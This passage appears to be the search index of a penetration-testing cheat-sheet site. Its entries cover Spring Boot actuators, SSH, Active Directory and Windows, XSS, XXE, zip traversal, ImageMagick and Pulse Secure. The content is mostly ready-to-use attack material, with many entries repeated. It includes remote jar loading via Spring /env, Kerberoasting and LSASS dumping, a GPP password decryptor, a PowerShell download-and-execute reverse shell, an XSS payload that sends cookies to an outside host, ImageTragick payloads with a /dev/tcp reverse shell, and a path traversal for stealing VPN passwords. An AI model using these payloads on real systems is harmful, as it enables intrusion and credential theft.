. It allow the user to perform the same actions as the JMX. https://<host>/path/jolokia/list It can be used to perform remote code execution.","title":"Jolokia"},{"location":"spring_boot/#env","text":"The /env endpoint allows to update the Spring Boot environmental properties. It's possible to execute SQL commands: POST /env HTTP/1.1 Host: <host> Content-Type: application/x-www-form-urlencoded Content-Length: 0 spring.datasource.tomcat.validationQuery=<sql cmd> Also, it's possible to update the env to execute code with the properties: spring.cloud.bootstrap.location which is used to load external configuration file: POST /env HTTP/1.1 Host: <host> Content-Type: application/x-www-form-urlencoded Content-Length: 0 spring.cloud.bootstrap.location=http://<attacker>/malicious-config-file.yml The malicious configuration file can be: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://<attacker>/malicious.jar\"] ]] ] You need to refresh the configuration: POST /refresh HTTP/1.1 Host: <host> Content-Type: application/x-www-form-urlencoded Content-Length: 0","title":"Env"},{"location":"ssh/","text":"Secure Shell Configuration Review Here is a good SSH configuration review/hardening guide: https://community.turgensec.com/ssh-hacking-guide/ SSH User Enumeration CVE-2018-15473 On OpenSSH version before 7.7, there is a bug that allow an unauthenticated user to check if a user exist on the remote server. A Python script using Paramiko is available on here . SFTP Command Injection Sometimes the SFTP user can execute a command because the configuration does not force the SFTP. ssh -v {USER}@{IP} id Start port forwarding on an existing session It's possible to start a new port forwarding on an existing session. Simply type <enter>~C to bring up a console with your local SSH client. Then you add a local ( -L ) or remote ( -R ) port forwarding. For instance, you type the following command to access the remote HTTPS server on the server on your local machine: <enter>~C-L 443:localhost:443<enter> The ~ is the SSH's default EscapeChar , there is more options available if you type ~? .","title":"SSH"},{"location":"ssh/#secure-shell","text":"","title":"Secure Shell"},{"location":"ssh/#configuration-review","text":"Here is a good SSH configuration review/hardening guide: https://community.turgensec.com/ssh-hacking-guide/","title":"Configuration Review"},{"location":"ssh/#ssh-user-enumeration-cve-2018-15473","text":"On OpenSSH version before 7.7, there is a bug that allow an unauthenticated user to check if a user exist on the remote server. A Python script using Paramiko is available on here .","title":"SSH User Enumeration CVE-2018-15473"},{"location":"ssh/#sftp-command-injection","text":"Sometimes the SFTP user can execute a command because the configuration does not force the SFTP. ssh -v {USER}@{IP} id","title":"SFTP Command Injection"},{"location":"ssh/#start-port-forwarding-on-an-existing-session","text":"It's possible to start a new port forwarding on an existing session. Simply type <enter>~C to bring up a console with your local SSH client. Then you add a local ( -L ) or remote ( -R ) port forwarding. For instance, you type the following command to access the remote HTTPS server on the server on your local machine: <enter>~C-L 443:localhost:443<enter> The ~ is the SSH's default EscapeChar , there is more options available if you type ~? .","title":"Start port forwarding on an existing session"},{"location":"waf/","text":"WAF Bypass WEF in PHP From: https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/ /news.php?%20news[id%00=42\"+AND+1=0-- /news.php?news_id=42","title":"WAF"},{"location":"waf/#waf","text":"","title":"WAF"},{"location":"waf/#bypass-wef-in-php","text":"From: https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/ /news.php?%20news[id%00=42\"+AND+1=0-- /news.php?news_id=42","title":"Bypass WEF in PHP"},{"location":"windows/","text":"Windows List SPN accounts An account can be used to executes features (Service) on a server. Theses features are calls SPNs and are represented as follow: service-class/hostname-FQDN(:port)(/arbitrary-name) More details are available on the Microsoft documentation The following LDAP query lists the accounts with a SPN on the domain: &(objectCategory=person)(objectClass=user)(servicePrincipalName=*) With Powershell, the script is the following: $users = (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))\")).FindAll() Kerberoast The Kerberoast attack consist on asking a TGS for a specific SPN then brute-force the hash to recover the account password. With the list of SPN account, the attacker is going to target accounts with privileges. The success of this attack depends on the company password policy. Rubeus dumps the hash of a target SPN account: Rubeus.exe kerberoast /creduser:\"<fqdn_dom>\\<user>\" /credpassword:\"<password>\" /domain:\"<fqdn_dom>\" /outfile:\"kerberoast.hash.txt\" You can also use the impacket script GetUserSPNs.py to get the hash in a format that John or Hashcat can brute-force: python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -format <john/empty> -outputfile hashes.txt KerberosUnConstrainedDelegation More information here $ Import-Module ActiveDirectory $ Get-ADComputer -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties 'TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,Description' # UserAccountControl & 0x80000 (TRUSTED_FOR_DELEGATION) # UserAccountControl & 0x100000 (TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) $ $computers = (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=Computer)(primaryGroupID=515)(useraccountcontrol:1.2.840.113556.1.4.804:=524288))\")).FindAll().Properties $ foreach($c in $computers) { echo \"$($c.name) ($($c.useraccountcontrol))\" } The website LdapWiki explains how to write a LDAP query. For instance, if we want to use bitwise in ldap queries, we need to use some special arguments. There are two Bitwise operation Extensible Match Rules. 1.2.840.113556.1.4.803 which is also referred to as LDAP_MATCHING_RULE_BIT_AND (Bitwise AND) 1.2.840.113556.1.4.804 which is also referred to as LDAP_MATCHING_RULE_BIT_OR (Bitwise OR) Kerberos preauthentication A domain user can have the property \"Do net required Kerberos preauthentication\". In this configuration, it's possible to ask to the KDC a TGT that is signed with the user password. So the clear password can be retrieve with a brute-force attack. The goal is to list the users that have this settings enable: Powerview : Get-DomainUser -PreauthNotRequired LDAP: userAccountControl:1.2.840.113556.1.4.803:=4194304 $users = (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=User)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\")).FindAll() Then you can use the impacket script GetNPUsers.py to get the TGT in a format that John or Hashcat can brute-force: python GetNPUsers.py <domain>/ -usersfile users.txt -format <john/empty> -outputfile hashes.txt From @harmj0y . List deleted users $deletedObjectsDom = get-addomain | select DeletedObjectsContainer $objects = Get-ADObject -SearchBase $deletedObjectsDom.DeletedObjectsContainer -ldapfilter \"(objectClass=user)\" -IncludeDeletedObjects -properties * foreach ($object in $objects) { $object } Get user owner Get-ADUser $USERNAME | ForEach-Object {Get-ACL \"AD:\\$($_.DistinguishedName)\" | Select-Object -ExpandProperty Owner} Collect AD users information # Helping functions function Get-ADUserDirectoryEntry($user) { return (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=User)(samAccountName=$user))\")).FindOne().GetDirectoryEntry() } function Get-ADUserGroups($user) { $userDirectoryEntry = Get-ADUserDirectoryEntry($user) $groups = $userDirectoryEntry.memberOf return $groups } function Get-ADGroupMembers($GroupName) { if ($GroupName -like \"CN=*\") { $GroupDistinguishedName = $GroupName } else { # find the distinguished name from the group name $GroupDistinguishedName = (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=Group)(cn=$GroupName))\")).FindOne().GetDirectoryEntry().distinguishedName } # limited to the first 10k entries $GroupMembers = (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=User)(memberOf=$GroupDistinguishedName ))\")).FindAll() return $GroupMembers.properties } # Get \"Domain admins\" users, be carefull the name may change depending on the DC lang $DomainAdmins = Get-ADGroupMembers(\"Domain Admins\") foreach($user in $DomainAdmins) { echo \"$($user.displayname) ($($user.samaccountname))\" } Decrypt GPO with cpassword #!/usr/bin/python import sys import binascii from Crypto.Cipher import AES from base64 import b64decode unpad = lambda s: s[:-1 * ord(s[-1])] def decrypt(cpassword): # Init the key # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2 key = binascii.unhexlify(\"4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b\") # Add padding to the base64 string and decode it cpassword += \"=\" * ((4 - len(cpassword) % 4) % 4) password = b64decode(cpassword) o = AES.new(key, AES.MODE_CBC, \"\\x00\" * 16).decrypt(password) return unpad(o).decode(\"utf16\") def main(): if len(sys.argv) != 2: print(\"Usage: gpprefdecrypt.py <cpassword>\") sys.exit(0) cpassword = sys.argv[1] o = decrypt(cpassword) print o if __name__ == \"__main__\": main() Use Win32 API in Python Download then install the pip package pywin32 here: https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32 Get NTP configuration server $ w32tm /query /status Windows 10 versions Release Informations Dump LSASS process There is various methods to dump the lsass process memory: Mimikatz ProcDump TaskManager Rundll32 lsassy Procdump procdump -accepteula -ma lsass.exe lsass.dmp Rundll32 & comsvcs.dll tasklist /fi \"imagename eq lsass.exe\" rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> lsass.dmp full SAM and SYSTEM backup $ reg save HKLM\\SYSTEM SystemBkup.hiv $ reg save HKLM\\SAM SamBkup.hiv Then with mimikatz you can recover the hashes: $ lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv Calculate NTLM hash import hashlib pwd = \"password\" print(hashlib.new('md4', f'{pwd}'.encode('utf-16le')).hexdigest()) List Email aliases $ (Get-ADUser -Identity <user_ad_id> -Properties proxyAddresses).proxyAddresses Truster Account The PDF from SSTIC 2014 describes trusts accounts on Windows: sAMAccountType: 805306370 = ( TRUST_ACCOUNT ); Compile .Net without Visual Studio $ cd \\Windows\\Microsoft.NET\\Framework\\v4* $ msbuild \"path\\to\\SharpUp-master\\SharpUp.sln\" /t:Rebuild /p:Configuration=Release /p:Platform=\"Any CPU\" Or to compile a single file: $ cd \\Windows\\Microsoft.NET\\Framework\\v4.0.30319 $ csc.exe /t:exe /out:path\\to\\main.exe path\\to\\main.cs using System; public class HelloWorld { public static void Main() { Console.WriteLine(\"Hello world!\"); } } Cmd Hijack You can confuse the cmd.exe binary with a directory traversal: cmd.exe /c \"ping 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe\" Using this, you can hijack an argument such as a IP address in the ping call to execute an other binary. Julian Horoszkiewicz explains the details on his blog List Wifi networks and password $ netsh wlan show profile $ netsh wlan show profile <WiFi name> key=clear TCP dump with netsh You can use netsh trace to dump TCP connexions on a Windows system. The following command start a service that dump the packets: $ netsh trace start scenario=NetConnection capture=yes report=yes persistent=no maxsize=1024 correlation=yes traceFile=C:\\Temp\\NetTrace.etl To start to service, you need to type: $ netsh trace stop When the service is stopped, it create an etl file (and a cab for the report) that contains the packets. To import it to Wireshark, you need to convert the file to a pcap file. The tool etl2pcapng can be used to convert the file. It's available on Github . $ etl2pcapng.exe NetTrace.etl NetTrace.pcapng IF: medium=eth ID=0 IfIndex=13 Converted 3948 frames Add user to local admin # create a local user $ net user <username> <password> /add # add user to local admin group $ net localgroup Administrators <username> /add Extract Microsoft Update files A Windows Update is a .msu archive that contains a .cab archive. This file contains the new binaries ( .dll , .exe , ...). To extract the two archive you can use the expand command: expand -f:* \"update.msu\" \"%temp%\\\\update.msu\" expand -f:* \"%temp%\\\\update.msu\\\\update.cab\" \"%temp%\\\\update.msu\\\\update.cab\" User enumeration LDAP search Here is two queries to fetch informations of a domain controller using LDAP: ldapsearch -h <host> -x -s base namingcontexts ldapsearch -h <host> -x -b \"DC=xxx,DC=yyy\" '(objectClass=Person)' sAMAccountName RPCClient If the NULL session is activated on the Windows domain, then you can list the users with rpcclient : rpcclient -U '' <host> rpcclient $> enumdomusers rpcclient $> queryuser <user> PowerShell Some useful PowerShell commands that you can use during your recon or privsec phases. Get PowerShell command history cd \"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadline\" gc ConsoleHost_history.txt Execute block as an other user $pass = ConvertTo-SecureString '<password>' -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential(\"<dom>\\<username>\", $pass) Invoke-Command -Computer <computer_name> -Credential $cred -ScriptBlock { cmd.exe \"/c <cmd>\" } Download and execute script The repository Nishang contains a good PowerShell script to create a reverse shell . You need to add the following line at the end: Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <port> On your local machine: Create an HTTP server to serve the script: python -m http.serve Listen for an incoming connection with nc . On the remote host, execute the following PowerShell script: IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/<script_name.ps1>') Get Domain Password Policy $policy = Get-ADDefaultDomainPasswordPolicy -Credential $cred -Server $domain Convert DACL $acl = get-acl HKLM:\\System\\CurrentControlSet\\Services ConvertFrom-SddlString -Sddl $acl -type RegistryRights | { Foreach-Object { $.DiscretionaryAcl } }","title":"Windows"},{"location":"windows/#windows","text":"","title":"Windows"},{"location":"windows/#list-spn-accounts","text":"An account can be used to executes features (Service) on a server. Theses features are calls SPNs and are represented as follow: service-class/hostname-FQDN(:port)(/arbitrary-name) More details are available on the Microsoft documentation The following LDAP query lists the accounts with a SPN on the domain: &(objectCategory=person)(objectClass=user)(servicePrincipalName=*) With Powershell, the script is the following: $users = (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))\")).FindAll()","title":"List SPN accounts"},{"location":"windows/#kerberoast","text":"The Kerberoast attack consist on asking a TGS for a specific SPN then brute-force the hash to recover the account password. With the list of SPN account, the attacker is going to target accounts with privileges. The success of this attack depends on the company password policy. Rubeus dumps the hash of a target SPN account: Rubeus.exe kerberoast /creduser:\"<fqdn_dom>\\<user>\" /credpassword:\"<password>\" /domain:\"<fqdn_dom>\" /outfile:\"kerberoast.hash.txt\" You can also use the impacket script GetUserSPNs.py to get the hash in a format that John or Hashcat can brute-force: python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -format <john/empty> -outputfile hashes.txt","title":"Kerberoast"},{"location":"windows/#kerberosunconstraineddelegation","text":"More information here $ Import-Module ActiveDirectory $ Get-ADComputer -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties 'TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,Description' # UserAccountControl & 0x80000 (TRUSTED_FOR_DELEGATION) # UserAccountControl & 0x100000 (TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) $ $computers = (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=Computer)(primaryGroupID=515)(useraccountcontrol:1.2.840.113556.1.4.804:=524288))\")).FindAll().Properties $ foreach($c in $computers) { echo \"$($c.name) ($($c.useraccountcontrol))\" } The website LdapWiki explains how to write a LDAP query. For instance, if we want to use bitwise in ldap queries, we need to use some special arguments. There are two Bitwise operation Extensible Match Rules. 1.2.840.113556.1.4.803 which is also referred to as LDAP_MATCHING_RULE_BIT_AND (Bitwise AND) 1.2.840.113556.1.4.804 which is also referred to as LDAP_MATCHING_RULE_BIT_OR (Bitwise OR)","title":"KerberosUnConstrainedDelegation"},{"location":"windows/#kerberos-preauthentication","text":"A domain user can have the property \"Do net required Kerberos preauthentication\". In this configuration, it's possible to ask to the KDC a TGT that is signed with the user password. So the clear password can be retrieve with a brute-force attack. The goal is to list the users that have this settings enable: Powerview : Get-DomainUser -PreauthNotRequired LDAP: userAccountControl:1.2.840.113556.1.4.803:=4194304 $users = (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=User)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\")).FindAll() Then you can use the impacket script GetNPUsers.py to get the TGT in a format that John or Hashcat can brute-force: python GetNPUsers.py <domain>/ -usersfile users.txt -format <john/empty> -outputfile hashes.txt From @harmj0y .","title":"Kerberos preauthentication"},{"location":"windows/#list-deleted-users","text":"$deletedObjectsDom = get-addomain | select DeletedObjectsContainer $objects = Get-ADObject -SearchBase $deletedObjectsDom.DeletedObjectsContainer -ldapfilter \"(objectClass=user)\" -IncludeDeletedObjects -properties * foreach ($object in $objects) { $object }","title":"List deleted users"},{"location":"windows/#get-user-owner","text":"Get-ADUser $USERNAME | ForEach-Object {Get-ACL \"AD:\\$($_.DistinguishedName)\" | Select-Object -ExpandProperty Owner}","title":"Get user owner"},{"location":"windows/#collect-ad-users-information","text":"# Helping functions function Get-ADUserDirectoryEntry($user) { return (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=User)(samAccountName=$user))\")).FindOne().GetDirectoryEntry() } function Get-ADUserGroups($user) { $userDirectoryEntry = Get-ADUserDirectoryEntry($user) $groups = $userDirectoryEntry.memberOf return $groups } function Get-ADGroupMembers($GroupName) { if ($GroupName -like \"CN=*\") { $GroupDistinguishedName = $GroupName } else { # find the distinguished name from the group name $GroupDistinguishedName = (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=Group)(cn=$GroupName))\")).FindOne().GetDirectoryEntry().distinguishedName } # limited to the first 10k entries $GroupMembers = (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=User)(memberOf=$GroupDistinguishedName ))\")).FindAll() return $GroupMembers.properties } # Get \"Domain admins\" users, be carefull the name may change depending on the DC lang $DomainAdmins = Get-ADGroupMembers(\"Domain Admins\") foreach($user in $DomainAdmins) { echo \"$($user.displayname) ($($user.samaccountname))\" }","title":"Collect AD users information"},{"location":"windows/#decrypt-gpo-with-cpassword","text":"#!/usr/bin/python import sys import binascii from Crypto.Cipher import AES from base64 import b64decode unpad = lambda s: s[:-1 * ord(s[-1])] def decrypt(cpassword): # Init the key # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2 key = binascii.unhexlify(\"4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b\") # Add padding to the base64 string and decode it cpassword += \"=\" * ((4 - len(cpassword) % 4) % 4) password = b64decode(cpassword) o = AES.new(key, AES.MODE_CBC, \"\\x00\" * 16).decrypt(password) return unpad(o).decode(\"utf16\") def main(): if len(sys.argv) != 2: print(\"Usage: gpprefdecrypt.py <cpassword>\") sys.exit(0) cpassword = sys.argv[1] o = decrypt(cpassword) print o if __name__ == \"__main__\": main()","title":"Decrypt GPO with cpassword"},{"location":"windows/#use-win32-api-in-python","text":"Download then install the pip package pywin32 here: https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32","title":"Use Win32 API in Python"},{"location":"windows/#get-ntp-configuration-server","text":"$ w32tm /query /status","title":"Get NTP configuration server"},{"location":"windows/#windows-10-versions","text":"Release Informations","title":"Windows 10 versions"},{"location":"windows/#dump-lsass-process","text":"There is various methods to dump the lsass process memory: Mimikatz ProcDump TaskManager Rundll32 lsassy","title":"Dump LSASS process"},{"location":"windows/#procdump","text":"procdump -accepteula -ma lsass.exe lsass.dmp","title":"Procdump"},{"location":"windows/#rundll32-comsvcsdll","text":"tasklist /fi \"imagename eq lsass.exe\" rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> lsass.dmp full","title":"Rundll32 &amp; comsvcs.dll"},{"location":"windows/#sam-and-system-backup","text":"$ reg save HKLM\\SYSTEM SystemBkup.hiv $ reg save HKLM\\SAM SamBkup.hiv Then with mimikatz you can recover the hashes: $ lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv","title":"SAM and SYSTEM backup"},{"location":"windows/#calculate-ntlm-hash","text":"import hashlib pwd = \"password\" print(hashlib.new('md4', f'{pwd}'.encode('utf-16le')).hexdigest())","title":"Calculate NTLM hash"},{"location":"windows/#list-email-aliases","text":"$ (Get-ADUser -Identity <user_ad_id> -Properties proxyAddresses).proxyAddresses","title":"List Email aliases"},{"location":"windows/#truster-account","text":"The PDF from SSTIC 2014 describes trusts accounts on Windows: sAMAccountType: 805306370 = ( TRUST_ACCOUNT );","title":"Truster Account"},{"location":"windows/#compile-net-without-visual-studio","text":"$ cd \\Windows\\Microsoft.NET\\Framework\\v4* $ msbuild \"path\\to\\SharpUp-master\\SharpUp.sln\" /t:Rebuild /p:Configuration=Release /p:Platform=\"Any CPU\" Or to compile a single file: $ cd \\Windows\\Microsoft.NET\\Framework\\v4.0.30319 $ csc.exe /t:exe /out:path\\to\\main.exe path\\to\\main.cs using System; public class HelloWorld { public static void Main() { Console.WriteLine(\"Hello world!\"); } }","title":"Compile .Net without Visual Studio"},{"location":"windows/#cmd-hijack","text":"You can confuse the cmd.exe binary with a directory traversal: cmd.exe /c \"ping 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe\" Using this, you can hijack an argument such as a IP address in the ping call to execute an other binary. Julian Horoszkiewicz explains the details on his blog","title":"Cmd Hijack"},{"location":"windows/#list-wifi-networks-and-password","text":"$ netsh wlan show profile $ netsh wlan show profile <WiFi name> key=clear","title":"List Wifi networks and password"},{"location":"windows/#tcp-dump-with-netsh","text":"You can use netsh trace to dump TCP connexions on a Windows system. The following command start a service that dump the packets: $ netsh trace start scenario=NetConnection capture=yes report=yes persistent=no maxsize=1024 correlation=yes traceFile=C:\\Temp\\NetTrace.etl To start to service, you need to type: $ netsh trace stop When the service is stopped, it create an etl file (and a cab for the report) that contains the packets. To import it to Wireshark, you need to convert the file to a pcap file. The tool etl2pcapng can be used to convert the file. It's available on Github . $ etl2pcapng.exe NetTrace.etl NetTrace.pcapng IF: medium=eth ID=0 IfIndex=13 Converted 3948 frames","title":"TCP dump with netsh"},{"location":"windows/#add-user-to-local-admin","text":"# create a local user $ net user <username> <password> /add # add user to local admin group $ net localgroup Administrators <username> /add","title":"Add user to local admin"},{"location":"windows/#extract-microsoft-update-files","text":"A Windows Update is a .msu archive that contains a .cab archive. This file contains the new binaries ( .dll , .exe , ...). To extract the two archive you can use the expand command: expand -f:* \"update.msu\" \"%temp%\\\\update.msu\" expand -f:* \"%temp%\\\\update.msu\\\\update.cab\" \"%temp%\\\\update.msu\\\\update.cab\"","title":"Extract Microsoft Update files"},{"location":"windows/#user-enumeration","text":"","title":"User enumeration"},{"location":"windows/#ldap-search","text":"Here is two queries to fetch informations of a domain controller using LDAP: ldapsearch -h <host> -x -s base namingcontexts ldapsearch -h <host> -x -b \"DC=xxx,DC=yyy\" '(objectClass=Person)' sAMAccountName","title":"LDAP search"},{"location":"windows/#rpcclient","text":"If the NULL session is activated on the Windows domain, then you can list the users with rpcclient : rpcclient -U '' <host> rpcclient $> enumdomusers rpcclient $> queryuser <user>","title":"RPCClient"},{"location":"windows/#powershell","text":"Some useful PowerShell commands that you can use during your recon or privsec phases.","title":"PowerShell"},{"location":"windows/#get-powershell-command-history","text":"cd \"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadline\" gc ConsoleHost_history.txt","title":"Get PowerShell command history"},{"location":"windows/#execute-block-as-an-other-user","text":"$pass = ConvertTo-SecureString '<password>' -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential(\"<dom>\\<username>\", $pass) Invoke-Command -Computer <computer_name> -Credential $cred -ScriptBlock { cmd.exe \"/c <cmd>\" }","title":"Execute block as an other user"},{"location":"windows/#download-and-execute-script","text":"The repository Nishang contains a good PowerShell script to create a reverse shell . You need to add the following line at the end: Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <port> On your local machine: Create an HTTP server to serve the script: python -m http.serve Listen for an incoming connection with nc . On the remote host, execute the following PowerShell script: IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/<script_name.ps1>')","title":"Download and execute script"},{"location":"windows/#get-domain-password-policy","text":"$policy = Get-ADDefaultDomainPasswordPolicy -Credential $cred -Server $domain","title":"Get Domain Password Policy"},{"location":"windows/#convert-dacl","text":"$acl = get-acl HKLM:\\System\\CurrentControlSet\\Services ConvertFrom-SddlString -Sddl $acl -type RegistryRights | { Foreach-Object { $.DiscretionaryAcl } }","title":"Convert DACL"},{"location":"xss/","text":"XSS Cheat sheet https://portswigger.net/web-security/cross-site-scripting/cheat-sheet DOMPurify 2.0 bypass https://research.securitum.com/dompurify-bypass-using-mxss/ http://qual-challs.rtfm.re:8080/?layout=<svg></p><style><a%20id=\"</style><style>%40keyframes%20slidein%20%7B%7D<%2Fstyle><a%20style%3D%27animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%27%20onanimationiteration%3Ddocument.location=%27https:%2F%2Fpostb.in%2F1570471277352-2268189566675%2F%27+document.cookie><%2Fa>%20\">","title":"XSS"},{"location":"xss/#xss","text":"","title":"XSS"},{"location":"xss/#cheat-sheet","text":"https://portswigger.net/web-security/cross-site-scripting/cheat-sheet","title":"Cheat sheet"},{"location":"xss/#dompurify-20-bypass","text":"https://research.securitum.com/dompurify-bypass-using-mxss/ http://qual-challs.rtfm.re:8080/?layout=<svg></p><style><a%20id=\"</style><style>%40keyframes%20slidein%20%7B%7D<%2Fstyle><a%20style%3D%27animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%27%20onanimationiteration%3Ddocument.location=%27https:%2F%2Fpostb.in%2F1570471277352-2268189566675%2F%27+document.cookie><%2Fa>%20\">","title":"DOMPurify 2.0 bypass"},{"location":"xxe/","text":"XML External Entity <!--?xml version=\"1.0\" ?--> <!DOCTYPE message [ <!ENTITY %local_dtd SYSTEM \"file://usr/share/yelp/dtd/docbookx.dtd\"> <!ENTITY % ' <!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; '> %local_dtd; ]> <message>...<message>","title":"XXE"},{"location":"xxe/#xml-external-entity","text":"<!--?xml version=\"1.0\" ?--> <!DOCTYPE message [ <!ENTITY %local_dtd SYSTEM \"file://usr/share/yelp/dtd/docbookx.dtd\"> <!ENTITY % ' <!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; '> %local_dtd; ]> <message>...<message>","title":"XML External Entity"},{"location":"zip/","text":"ZIP Exploit Path Traversal on decompress Some programs do not check the zip path while extracting the archive. Then it's possible to exploit this to extract a file to a custom location. import os import zipfile def zip(dst): zf = zipfile.ZipFile('%s.zip' % dst, 'w', zipfile.ZIP_DEFLATED) zf.writestr('../../../../../../../tmp/test.txt', 'toto') if __name__ == '__main__': zip('test')","title":"Zip"},{"location":"zip/#zip","text":"","title":"ZIP"},{"location":"zip/#exploit-path-traversal-on-decompress","text":"Some programs do not check the zip path while extracting the archive. Then it's possible to exploit this to extract a file to a custom location. import os import zipfile def zip(dst): zf = zipfile.ZipFile('%s.zip' % dst, 'w', zipfile.ZIP_DEFLATED) zf.writestr('../../../../../../../tmp/test.txt', 'toto') if __name__ == '__main__': zip('test')","title":"Exploit Path Traversal on decompress"},{"location":"cve/CVE-2016-3714/","text":"ImageMagick (CVE-2016\u20133714) There is a vulnerability in ImageMagick, that can lead to RCE. THe vulnerability description and exploitation are described on the official website ImageTragick . Common exploits exploit.mvg push graphic-context viewbox 0 0 640 480 fill 'url(https://127.0.0.1/x.jpg\"|wget http://<server_ip>/$(whoami)' pop graphic-context exploit.svg <?xml version=\"1.0\" standalone=\"no\"?> <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\";> <svg width=\"640px\" height=\"480px\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\"; xmlns:xlink=\"http://www.w3.org/1999/xlink\";> <image xlink:href=\"https://127.0.0.1/x.jpg&quot;|wget http://<server_ip>/$(whoami)\" x=\"0\" y=\"0\" height=\"640px\" width=\"480px\"/> </svg> exploit.jpg %!PS userdict /setpagedevice undef legal { null restore } stopped { pop } if legal mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/<host>/8080 0>&1') currentdevice putdeviceprops Others vulnerabilities There is others known vulnerabilities: CVE-2016-3718 - SSRF CVE-2016-3715 - File deletion CVE-2016-3716 - File moving CVE-2016-3717 - Local file read","title":"CVE-2016-3714"},{"location":"cve/CVE-2016-3714/#imagemagick-cve-20163714","text":"There is a vulnerability in ImageMagick, that can lead to RCE. THe vulnerability description and exploitation are described on the official website ImageTragick .","title":"ImageMagick (CVE-2016\u20133714)"},{"location":"cve/CVE-2016-3714/#common-exploits","text":"exploit.mvg push graphic-context viewbox 0 0 640 480 fill 'url(https://127.0.0.1/x.jpg\"|wget http://<server_ip>/$(whoami)' pop graphic-context exploit.svg <?xml version=\"1.0\" standalone=\"no\"?> <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\";> <svg width=\"640px\" height=\"480px\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\"; xmlns:xlink=\"http://www.w3.org/1999/xlink\";> <image xlink:href=\"https://127.0.0.1/x.jpg&quot;|wget http://<server_ip>/$(whoami)\" x=\"0\" y=\"0\" height=\"640px\" width=\"480px\"/> </svg> exploit.jpg %!PS userdict /setpagedevice undef legal { null restore } stopped { pop } if legal mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/<host>/8080 0>&1') currentdevice putdeviceprops","title":"Common exploits"},{"location":"cve/CVE-2016-3714/#others-vulnerabilities","text":"There is others known vulnerabilities: CVE-2016-3718 - SSRF CVE-2016-3715 - File deletion CVE-2016-3716 - File moving CVE-2016-3717 - Local file read","title":"Others vulnerabilities"},{"location":"cve/CVE-2019-11510/","text":"Pulse Secure (CVE-2019-11510) Description There is a Path Traversal vulnerability on Pulse Secure VPN endpoint: curl --path-as-is -k -D- 'https://<hostname>/dana-na/../dana/html5acc/guacamole/../../../../../../etc/hosts?/dana/html5acc/guacamole/#' You can grab the following files: /data/runtime/mtmp/system /data/runtime/mtmp/lmdb/dataa/data.mdb /data/runtime/mtmp/lmdb/dataa/lock.mdb /data/runtime/mtmp/lmdb/randomVal/data.mdb /data/runtime/mtmp/lmdb/randomVal/lock.mdb The VPN user and hashed passwords are stored in the mtmp/system file, but when users log into the application, it caches the plain-text password into dataa/data.mdb . grep 'password@9' data.mdb 